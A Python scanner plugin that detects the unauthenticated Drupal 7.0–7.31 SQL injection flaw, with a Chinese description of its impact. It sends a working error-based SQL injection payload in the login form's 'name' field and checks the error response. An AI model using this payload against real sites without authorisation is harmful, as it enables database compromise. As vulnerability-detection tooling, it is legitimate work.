# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "Drupal SQL注入漏洞",
        "version": "7.0-7.31",
        "description": "Drupal 是一款用量庞大的CMS，其中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码",
        "references": ["-"],
    }

    def url(self) -> dict:
        random_int = self.build_random_int(7)
        r = self.request(
            method='POST',
            path='./node?destination=node',
            timeout=15,
            headers={
                "Content-Type": "application/x-www-form-urlencoded"
            },
            data=f"name=123&pass=123&form_build_id=form-p_5TxNSaA9gPLjeUqFInIi2AwsMLx4E8vOzYdx9T8dk&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,bin({random_int})),0)%23]=bob&name[0]=a"
        )
        if r.status_code == 500 and str(bin(random_int))[2:] in r.text:
            return {"LoopholeInfo": self.__info__}
